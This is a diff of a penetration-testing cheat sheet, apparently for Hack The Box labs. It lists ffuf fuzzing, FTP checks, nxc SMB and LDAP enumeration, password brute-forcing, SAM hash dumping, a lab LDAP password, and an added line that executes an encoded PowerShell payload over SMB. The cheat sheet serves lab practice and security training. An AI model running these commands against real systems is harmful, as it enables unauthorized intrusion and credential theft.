@@ -30,15 +30,15 @@ nmap -sU --top-ports 20 -oN scan.nmap -vv $ip  (UDP)
 Always look up documentation of service you're trying to exploit, 90% of the time the answer will be there if you feel all other vectors are off
 {% endhint %}
 
-<pre><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -h (try -H) 'Host: FUZZ.board.htb' -f(c/s/w)   
+<pre><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -H 'Host: FUZZ.board.htb' -f(c/s/w)   
 (Directory) ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP:PORT/FUZZ 
-(File fuzzing) ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt    
-(HTTP GET)  ffuf -w [wordlist] -u [URL]/?FUZZ=key -fs xxx        
+(File fuzzing) -e .php,.html,.txt            
 (HTTP POST) ffuf -w [wordlist] -u [URL] -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'header: value' -fs xxx  
 (Use raw request) : ffuf -request request.txt -request-proto http -w wordlist.txt -r [FUZZ should be present in the request]
 (Multiple params) ffuf -w list1.txt:W1 -w list2.txt:W2 -X POST -d "username=W1&#x26;password=W2" -u [URL] -fc 200
 -p "1.0" and -rate [25]  to rate limit incase of WAF
 -r follow redirect
+-recursion
 wfuzz -c -w /usr/share/wordlists/yes.txt -u "http://alert.htb/" -H "Host: FUZZ.alert.htb"
 
 curl --insecure -b "[cookiename]=[value]" -X POST --data "[data]" [URL] (--insecure bypass SSL verification)
@@ -47,6 +47,11 @@ nikto -h $ip
 </code></pre>
 
 ### FTP (21)
+
+* Version number and associated CVEs
+* Anonymous / authenticated login (with discovered creds)
+* Sensitive files that you have read access to
+* File upload
 
 ```
 wget -r ftp://anonymous:@<IP>    [If you can't see anything or don't really know where you are]
@@ -105,6 +110,7 @@ nxc smb [ip]
 nxc smb 10.10.11.35 -u userlist.txt -p 'password' [bruteforce usernames, change smb to winrm/ldap or any other protocol you want to test perms for]
 nxc smb [host/ip] -u guest -p '' --shares [list shares depending on user access provided]
 nxc smb [host] -u [user] -p [password] --sam
+nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
 
 SMBCLIENT [INTERACT WITH SMB]
 smbclient //[ip]/[share] -N -L [List share with null auth]
@@ -164,6 +170,9 @@ ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAcco
 
 ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep "User" -B 20 -A 20
 ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(&(objectClass=Person)(cn=support))'| grep "User" -A 20 -B 20
+
+nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users
+nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users --groups
 ```
 
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" %}
